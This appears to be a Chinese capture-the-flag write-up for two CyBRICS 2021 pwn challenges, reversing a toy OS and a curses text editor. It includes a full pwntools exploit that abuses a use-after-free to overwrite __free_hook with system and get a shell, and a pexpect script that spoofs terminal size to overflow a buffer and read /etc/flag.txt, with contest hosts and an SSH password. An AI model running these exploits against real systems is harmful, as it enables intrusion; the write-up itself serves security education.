---
title: cybrics2021_pwn
date: 2021-07-25 19:16:11
permalink: /pages/cc208d/
categories:
  - ctf_wp
  - cybrics
tags:
  - 
---


# cybrics2021_pwn 

[[toc]]

膜队友ak rev, syclover今年也很努力!

![image-20210725191956753](https://i.loli.net/2021/07/25/jqWs231AuFgGICa.png)

## gross(done)

### 逆向

拿到题目就开始逆向, 简单分析, 程序本身main文件是做了个简易的os, 有程序加载运行的功能, 然后programs文件夹内存放的是几个自定义格式的二进制文件, 程序就直接启动了shell, 然后进入运行.

进行分析, 调试+分析, 符号比较全, 逆向难度不太大.

#### 主程序main

main函数比较简洁, 首先使用`load_program`函数将自定义格式的文件解析并载入到内存中, 然后设置名字后调用`dump_program`打印程序信息, 调用`spawn`函数新建一个线程来运行载入进内存的文件, 然后一直在`handle_requests`函数运行, 直到所有程序都结束os退出(所有线程都结束程序退出)

![image-20210725194601531](https://i.loli.net/2021/07/25/TqrYv9Pbiwlx6mF.png)

函数`spawn`中, 在内存中找到了对应程序的起始地址然后开启一个新线程去运行, 以此模拟一个程序运行在os中, 并且通过`socket`进行数据通讯, 调用`add_process`函数维护一个全局单向链表`.bss:0000000000005028 processes`, 这个链表储存所有在这个os中运行起来的程序, 注意这个pea结构体, 这也是线程运行时的参数1, 

![image-20210726100446814](https://i.loli.net/2021/07/26/3MGC1a8oK7eknsw.png)

然后在函数`handle_requests`, 首先调用`fill_fds`遍历`process`并填充满`fds`列表, 判断如果没有线程了,程序推出, 不然一直在这里循环, 

然后是20行, 查看每个`fds`即依次查看每个os内启动的程序, 进入make_syscall函数进行处理.

![image-20210726100235895](https://i.loli.net/2021/07/26/XsuWFUIvGL4t3kb.png)

`make_syscall`函数如下:

程序和os通过socket进行通讯, 首先os读取要读取的数据大小, 然后读取数据进来, 其中数据格式是开头为`syscall_num`标识系统调用号,后面为对应传入的参数, 以下系统调用还比较明了

> 系统调用的switch要修复下跳转表,

![image-20210726102836633](https://i.loli.net/2021/07/26/ZiXh7OUdSJ3CcnD.png)

系统调用4, 这一套操作其实和程序最开始导入`programes/shell`一致, 就是再创建一个线程,并放到`process`链表中, 然后在`handle_requests`函数中循环的时候就有两个程序在os中运行, 会分别处理.

![image-20210726102954246](https://i.loli.net/2021/07/26/PwtDnX8pofQNrAb.png)

系统调用5, 就是个结束线程并释放掉这个进程的相关内存, 表示os内一个程序推出了.

![image-20210726103035921](https://i.loli.net/2021/07/26/AI2VenU1wJpEhCq.png)

![image-20210726103114702](https://i.loli.net/2021/07/26/bRclyxPSh8KID7G.png)

主程序模拟一个os的流程分析结束, 然后我们应该分析下几个文件.

#### shell 

导入ida64, 二进制文件方式导入, ida会自动分析一部分, 然后编译选项选择gun c++. 

按照os中对于程序的解析来看, 这个程序入口点在

![image-20210726104831315](https://i.loli.net/2021/07/26/DJ7M1NBf4S6URXr.png)

`code_offste + entry = 0x0400+0x02f5 = 0x06F5`

`shell_main`函数只有一个参数, 也就是我们前面`spawn`函数中看到的pea结构体, 有点类似c++的this指针这里我定义为`shell_this`结构体:

![image-20210726105234085](https://i.loli.net/2021/07/26/M8K4jBgUlaoILhx.png)

简单分析, 发现程序内调用这个`syscall_fcn`函数挺多, 这个函数在os中, 我们再回去分析, 

`syscall_fcn`函数, 基本可以看出来和`make_syscall`函数对应, `make_syscall`函数是os处理程序的系统调用的, `syscall_fcn`是留给程序向os发送系统调用通讯的.

![image-20210726105554334](https://i.loli.net/2021/07/26/aenfAl9ZgWjohSs.png)

另外这个`args`结构体也在程序中被使用到了,定义如下:

![image-20210726105755637](https://i.loli.net/2021/07/26/tYWQkcVijEwnq1e.png)

然后配合`syscall_fcn`函数的分析, 如下的函数基本可以识别为函数调用, 示例write函数(`seg000:00000000000005DA write_user`), 其他类似, 

![image-20210726105906238](https://i.loli.net/2021/07/26/v8fBsGyNWDhaZzt.png)

于是可以基本分析出来`shell_main`函数, 其实就是内置了三个功能, sleep只会暂停一下, exit直接退出, spawn可以发送`syscall4:spawn(pname)`启动另一个程序.

实际上能用的功能只是启动其他程序, 于是把剩下几个也得分析了.

![image-20210726110032846](https://i.loli.net/2021/07/26/3VtFvPGmJXkdeoU.png)

#### programs

这里就基本分析完shell和os了, 剩下的几个分析就非常顺了.

echo 就是个复读机,没啥意思.

![image-20210726110435731](https://i.loli.net/2021/07/26/SGBLU6EDdCz5MsI.png)

cat能实现任意文件读取, 但是限制了字符`.`, 读不了`flag.txt`,

> 其实还有个没有`.`的flag, gross2题目的flag, 但是又没给名字, 猜不到文件名字
>
> 感觉可能他这个出题思路应该是一个flag有., 一个没有, 这样逆向到cat有一个flag, pwn拿到shell一个flag,放题整错了吧...

![image-20210726110509282](https://i.loli.net/2021/07/26/XvA73GHzOxjWtQb.png)

![image-20210726110523790](https://i.loli.net/2021/07/26/C7bL4P1DaUJI8GF.png)

#### storage

看起来就不太对的一个文件, 逆向完os的sysccall以后还跟队友说, `"我觉得这个改改可以出堆菜单题啊"`, 结果:

storage_main函数, 这里细节还是有些问题, 没调整太好,但是基本可以看到是个堆菜单题,

![image-20210726111732798](https://i.loli.net/2021/07/26/B2Z4qtKuSg7VYQy.png)

基本是常规的, 没有啥检测和限制, free里面有个uaf, 随意读取和修改,

![image-20210726111902171](https://i.loli.net/2021/07/26/Uwl8KCWAdhiHaED.png)

### 利用

就是先从shell切到storage, 然后一个啥检测也没有uaf的洞, 先拿一个0x500的chunk, 仍unsortedbin, 得到main_arean, 然后得到malloc_hook, 通过这个低三位可以查到六个libc, 这里把free_hook改成了puts, 然后远程测试出来一个打印出/bin/sh的就是对的, ubuntu 2.27-1.4就是远程的, puts直接改成system就可以拿到shell了, 

exp如下, 拿到shll就有个gross1和gross2的flag了

```python 
from pwn import * 

def init():
    sla("shell(0)<", "SPAWN")
    ru(" Enter process name")
    sla("shell(0)<", "storage")
    sla("shell(0)<", "EXIT")

def add(idx, size):
    sla(")< ", "1")
    sla(")< ", str(idx))
    sla(")< ", str(size))

def dele(idx):
    sla(")< ", "2")
    sla(")< ", str(idx))

def show(idx):
    sla(")< ", "4")
    sla(")< ", str(idx))

def edit(idx, data):
    sla(")< ", "3")
    sla(")< ", str(idx))
    sla(")< ", data)

def exp():
    init()
    add(0, 0x500)
    add(1, 0x20)
    dele(0)
    show(0)
    ru(")> ")
    leak = u64(re(8, 2))
    slog['leak'] = leak
    main_arean = leak - 96
    malloc_hook = main_arean - 0x10
    slog['mhook'] = malloc_hook
    
    libc = malloc_hook - pmhook
    puts = libc + pputs
    system = libc + psystem
    fhook = libc  + pfhook
    
    add(3, 0x40)
    edit(3, '/bin/sh\x00')

    dele(1)
    edit(1, flat(fhook))
    show(1)
    add(1, 0x20)
    add(2, 0x20)
    edit(2, flat(system))

    dele(3)
    sl("cat flag.txt")
    sl("cat bTAkUG9eCMgCbGMQbx8a")



context.os='linux'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
local = int(sys.argv[1])
context.arch='amd64'


if local:
    cn = process('./rbin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote("109.233.61.10", 11710)

libc2714 = 1
if libc2714:
    pmhook = 0x00000000003ebc30
    pputs  = 0x000000000080aa0
    pfhook = 0x00000000003ed8e8
    psystem = 0x04f550


re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)

exp()

ia()
 
```

![image-20210726112818057](https://i.loli.net/2021/07/26/fD7tkjhKxEZMYoO.png)

## little buggy editor 

文本编辑器, 这个题目一开始逆完了以后一直没找到啥漏洞点, 可以任意打开文件读取, 但是不能数据`/`和`..`, 思路大体是通过溢出`global_buffer`去修改后面的`filename`, 但是一直没想到漏洞怎么溢出, 

后面队友说终端大小会影响xy的范围, 于是终端最大化字体最小试了半天,emmmmm, 比赛结束看到别的师傅是通过脚本伪造终端大小, 复现了下, 我是傻子.

### 逆向

程序比较简单, 先初始化, 然后打印, 获取输入, 判断是否为控制字符, 进行对应操作, 如果不是的话写入到`GlobalBuffer`中, 然后通过max_x, max_y限制大小, 大体的按键如下:

> 键盘按键参考的[这个](https://github.com/jmcb/python-pdcurses/blob/master/curses.h), [转义序列](https://en.wikipedia.org/wiki/ANSI_escape_code#Control_characters) 和 `infocmp -L`, 

```
F2   = "\x1bOQ"
F3   = "\x1bOR"
F4   = "\x1bOS"
F5   = "\x1b[15~"
F10  = "\x1b[21~"

DELE = '\x7f'
END  = "\x1bOF"
DOWN = "\x1bOB"
UP   = "\x1bOA"
LEFT = "\x1bOD"
RIGH = "\x1bOC"


delete cahracter
	[backspace] 
	[DC]
cursor move
	y++
		[END]	(y=max_y-1)
		[RIGHT]	[check x<max_x-3]
	y--
		[HOME]	(y=0)
		[LEFT]
	x++
		[DOWN]	[check x<max_x-3]
	x--
		[UP]	[check x>0]

file:
	reload file 
		[F5]
		read_file
	open file 
		[F3]
		set_filename
		read_file
	rename file 
		[F4]
		set_filename 
	save file 
		[F2]
		set_filename
		write_file 
exit
	[F10]
```



![image-20210726144723568](https://i.loli.net/2021/07/26/aFgSE3DCmYHQXhV.png)

![image-20210726144811161](https://i.loli.net/2021/07/26/pm2l14cyijOQBu6.png)

![image-20210726144854063](https://i.loli.net/2021/07/26/qFNvIwJLT93Ad8c.png)

![image-20210726144950572](https://i.loli.net/2021/07/26/u6hmQTEgkWs8P9c.png)

![image-20210726145019339](https://i.loli.net/2021/07/26/w7XoRJEpkxjLVUz.png)

文件相关的功能主要是读取文件名, 然后写入文件或者打开文件, 其实是可以实现一个任意文件读写的能力, 

但是在`read_filename`函数中这里不允许`..`而且不允许`/`字符, 于是无法读取到`/etc/flag.txt`, 

![image-20210726145844799](https://i.loli.net/2021/07/26/UmSZGicFDM759yw.png)

### 利用

也没有个堆/栈啥的, 大概的思路就是溢出`GlobalBuffer`往后改掉`FileName`:

![image-20210726152816302](https://i.loli.net/2021/07/26/Nk9anvqPKRuTh73.png)

然后漏洞应该是在main函数中对于xy的check是检测maxx maxy, 这两个是通过函数`getsize`获得, 其实是终端的大小, 我们测试也可以发现终端大小是会导致显示不同的,

> 题目描述给的book文件, 终端全屏可以显示更多信息, 

然后之前是到这里就手动去测试了, 想来应该理解到, 如果真的溢出的话也是要通过脚本进行利用的, 所以应该要去找可以修改终端大小的脚本, 然后再调试利用.

> 复现的时候用了pexpect这个库, 好像用pwntools没有setwinsize这个解决方案, 恰好翻到[zio](https://github.com/zTrix/zio/blob/master/zio.py#L1769)其实也有, 但是也是抄的pexpect的.

其实就是向下501步(500*501=0x3d090+0x1f4), 然后填充0x1c(28)个字符, 就是filename了,写入/etc/flag即可.

```python
import pexpect 
import sys

F2   = "\x1bOQ"
F3   = "\x1bOR"
F4   = "\x1bOS"
F5   = "\x1b[15~"
F10  = "\x1b[21~"

DELE = "\x7f"

END  = "\x1bOF"

UP   = "\x1bOA"
DOWN = "\x1bOB"
RIGH = "\x1bOC"
LEFT = "\x1bOD"

local = int(sys.argv[1])

if local:
    cn =  pexpect.spawn("./bin")
else:
    cn = pexpect.spawn("ssh tolstoy@64.227.123.153")
    cn.expect("password:")
    cn.sendline("W&P1867")

cn.setwinsize(505, 500)
cn.send(DOWN * 501)
cn.send("a" * 28)
cn.send("/etc/flag.txt")
cn.send(F5)

cn.interact()

```

得到flag:

![image-20210726142508026](https://i.loli.net/2021/07/26/XYsRn5ewaqTlE2h.png)
